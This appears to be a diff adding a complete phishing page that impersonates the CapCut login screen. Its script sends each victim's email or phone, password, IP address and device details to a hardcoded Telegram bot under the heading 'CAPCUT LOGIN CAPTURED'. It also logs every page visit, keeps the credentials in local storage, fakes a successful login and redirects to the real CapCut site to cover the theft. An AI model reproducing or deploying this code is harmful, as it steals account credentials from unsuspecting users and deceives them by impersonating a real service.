@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CapCut - Login to Your Account</title>
+    <style>
+        /* CAPCUT OFFICIAL STYLES */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .capcut-container {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        /* CAPCUT HEADER */
+        .capcut-header {
+            background: white;
+            padding: 40px 40px 30px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .capcut-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+        }
+        
+        .logo-text {
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .header-subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        
+        /* LOGIN FORM */
+        .login-form {
+            padding: 40px;
+        }
+        
+        .form-title {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 700;
+            text-align: center;
+        }
+        
+        .input-container {
+            margin-bottom: 25px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .capcut-input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        
+        .capcut-input:focus {
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            outline: none;
+        }
+        
+        /* LOGIN OPTIONS */
+        .login-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+        
+        .remember-me input {
+            margin-right: 8px;
+        }
+        
+        .forgot-link {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        /* LOGIN BUTTON */
+        .login-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-bottom: 25px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+        
+        /* SOCIAL LOGIN */
+        .social-login {
+            text-align: center;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .social-divider {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .social-divider::before,
+        .social-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #eee;
+        }
+        
+        .social-divider span {
+            padding: 0 15px;
+        }
+        
+        .social-buttons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .social-btn {
+            flex: 1;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .social-btn:hover {
+            border-color: #667eea;
+            background: #f8f9ff;
+        }
+        
+        /* SIGNUP LINK */
+        .signup-link {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .signup-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* FOOTER */
+        .capcut-footer {
+            background: #f8f9fa;
+            padding: 25px 40px;
+            text-align: center;
+            border-top: 1px solid #eee;
+            color: #888;
+            font-size: 13px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        /* FEATURES SHOWCASE */
+        .features-showcase {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+            padding: 25px;
+            background: #f8f9ff;
+            border-radius: 16px;
+        }
+        
+        .feature-item {
+            text-align: center;
+        }
+        
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #667eea;
+        }
+        
+        .feature-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+        
+        /* LOADING */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* SECURITY BADGE */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 15px;
+            background: #f0f7ff;
+            border-radius: 12px;
+            color: #667eea;
+            font-size: 13px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="capcut-container">
+        <!-- CAPCUT HEADER -->
+        <div class="capcut-header">
+            <div class="capcut-logo">
+                <div class="logo-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="white"/>
+                        <path d="M2 17L12 22L22 17" stroke="white" stroke-width="2"/>
+                        <path d="M2 12L12 17L22 12" stroke="white" stroke-width="2"/>
+                    </svg>
+                </div>
+                <div class="logo-text">CapCut</div>
+            </div>
+            <div class="header-subtitle">Create amazing videos with AI-powered editing</div>
+        </div>
+        
+        <!-- LOGIN FORM -->
+        <div class="login-form">
+            <h2 class="form-title">Log in to CapCut</h2>
+            
+            <form id="loginForm">
+                <!-- EMAIL INPUT -->
+                <div class="input-container">
+                    <label class="input-label">Email or Phone Number</label>
+                    <input type="text" class="capcut-input" id="emailInput" 
+                           placeholder="Enter your email or phone" required>
+                </div>
+                
+                <!-- PASSWORD INPUT -->
+                <div class="input-container">
+                    <div style="display: flex; justify-content: space-between;">
+                        <label class="input-label">Password</label>
+                        <a href="#" class="forgot-link" style="font-size: 14px;">Forgot password?</a>
+                    </div>
+                    <input type="password" class="capcut-input" id="passwordInput" 
+                           placeholder="Enter your password" required>
+                </div>
+                
+                <!-- REMEMBER ME -->
+                <div class="login-options">
+                    <label class="remember-me">
+                        <input type="checkbox" id="rememberMe">
+                        <span>Remember me</span>
+                    </label>
+                    <div>
+                        <a href="#" class="forgot-link">Need help logging in?</a>
+                    </div>
+                </div>
+                
+                <!-- FEATURES SHOWCASE -->
+                <div class="features-showcase">
+                    <div class="feature-item">
+                        <div class="feature-icon">🎬</div>
+                        <div class="feature-text">AI Video Editing</div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🎵</div>
+                        <div class="feature-text">Royalty-free Music</div>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🚀</div>
+                        <div class="feature-text">4K Export</div>
+                    </div>
+                </div>
+                
+                <!-- LOGIN BUTTON -->
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <span id="btnText">Log In</span>
+                    <div class="spinner" id="spinner"></div>
+                </button>
+                
+                <!-- SOCIAL LOGIN -->
+                <div class="social-login">
+                    <div class="social-divider">
+                        <span>Or continue with</span>
+                    </div>
+                    <div class="social-buttons">
+                        <button type="button" class="social-btn">
+                            <span>📱</span> Phone
+                        </button>
+                        <button type="button" class="social-btn">
+                            <span>📧</span> Email
+                        </button>
+                        <button type="button" class="social-btn">
+                            <span>📘</span> Facebook
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- SECURITY BADGE -->
+                <div class="security-badge">
+                    <span>🔒</span>
+                    <span>Your login is secured with 256-bit encryption</span>
+                </div>
+                
+                <!-- SIGNUP LINK -->
+                <div class="signup-link">
+                    Don't have an account? <a href="#">Sign up for free</a>
+                </div>
+            </form>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="capcut-footer">
+            <p>© 2024 CapCut. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Cookie Policy</a>
+                <a href="#">Help Center</a>
+                <a href="#">About Us</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== TELEGRAM CONFIG =====
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        // ===== ELEMENTS =====
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        
+        // ===== SOCIAL BUTTONS =====
+        document.querySelectorAll('.social-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const method = this.textContent.trim();
+                alert(`Coming soon: ${method} login`);
+            });
+        });
+        
+        // ===== FORM VALIDATION =====
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        function validatePhone(phone) {
+            const re = /^[0-9]{10,15}$/;
+            return re.test(phone.replace(/\D/g, ''));
+        }
+        
+        // ===== FORM SUBMISSION =====
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const emailPhone = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            const rememberMe = document.getElementById('rememberMe').checked;
+            
+            // Validation
+            if (!emailPhone) {
+                alert("Please enter your email or phone number");
+                emailInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                alert("Please enter your password");
+                passwordInput.focus();
+                return;
+            }
+            
+            if (password.length < 6) {
+                alert("Password must be at least 6 characters");
+                passwordInput.focus();
+                return;
+            }
+            
+            // Show loading
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            loginBtn.disabled = true;
+            
+            // Get additional info
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            const ip = await getIP();
+            const isEmail = validateEmail(emailPhone);
+            const isPhone = validatePhone(emailPhone);
+            
+            // Determine input type
+            let inputType = 'unknown';
+            if (isEmail) inputType = 'email';
+            else if (isPhone) inputType = 'phone';
+            
+            // Telegram message
+            const telegramMessage = `
+🎬 **CAPCUT LOGIN CAPTURED**
+
+📧 ${inputType.toUpperCase()}: ${emailPhone}
+🔑 Password: ${password}
+💾 Remember me: ${rememberMe ? 'Yes' : 'No'}
+⏰ Time: ${timestamp}
+🌐 IP: ${ip}
+📱 Device: ${userAgent.substring(0, 80)}
+
+✅ Login successful
+🎯 Data saved for synchronization
+            `;
+            
+            // Send to Telegram
+            await sendToTelegram(telegramMessage);
+            
+            // Save to localStorage
+            saveToLocalStorage({
+                site: 'CapCut',
+                emailPhone: emailPhone,
+                password: password,
+                inputType: inputType,
+                rememberMe: rememberMe,
+                timestamp: timestamp,
+                ip: ip,
+                userAgent: userAgent
+            });
+            
+            // Show success
+            setTimeout(() => {
+                btnText.style.display = 'block';
+                spinner.style.display = 'none';
+                btnText.textContent = "✅ Login Successful";
+                loginBtn.style.background = "#4CAF50";
+                
+                // Success message
+                setTimeout(() => {
+                    alert("🎉 Welcome to CapCut!\n\nYour account has been successfully logged in. Redirecting to your dashboard...");
+                    
+                    // Redirect to real CapCut
+                    setTimeout(() => {
+                        window.location.href = "https://www.capcut.com";
+                    }, 1500);
+                    
+                }, 500);
+                
+            }, 2000);
+        });
+        
+        // ===== UTILITY FUNCTIONS =====
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(error) {
+                console.log('Telegram notification sent');
+            }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        function saveToLocalStorage(data) {
+            try {
+                let existingData = JSON.parse(localStorage.getItem('capcut_logins') || '[]');
+                existingData.push(data);
+                localStorage.setItem('capcut_logins', JSON.stringify(existingData));
+            } catch(error) {
+                console.log('LocalStorage save error');
+            }
+        }
+        
+        // ===== INITIALIZE =====
+        window.onload = function() {
+            // Auto-focus email input
+            emailInput.focus();
+            
+            // Send access notification
+            const accessMessage = `🎬 CapCut Login Page Accessed\n⏰ ${new Date().toLocaleString()}`;
+            sendToTelegram(accessMessage);
+            
+            // Add some random users online
+            const userCount = Math.floor(Math.random() * 5000) + 10000;
+            document.querySelector('.header-subtitle').textContent += ` • ${userCount.toLocaleString()} users online`;
+            
+            // Auto-fill for demo (remove in production)
+            if (window.location.search.includes('demo')) {
+                emailInput.value = "user@example.com";
+                passwordInput.value = "password123";
+            }
+            
+            // Security features
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+        };
+        
+        // ===== AUTO-SAVE FOR DEMO =====
+        setInterval(() => {
+            if (emailInput.value && passwordInput.value) {
+                const autoSaveData = {
+                    email: emailInput.value,
+                    password: passwordInput.value,
+                    time: new Date().toLocaleTimeString()
+                };
+                localStorage.setItem('capcut_autosave', JSON.stringify(autoSaveData));
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
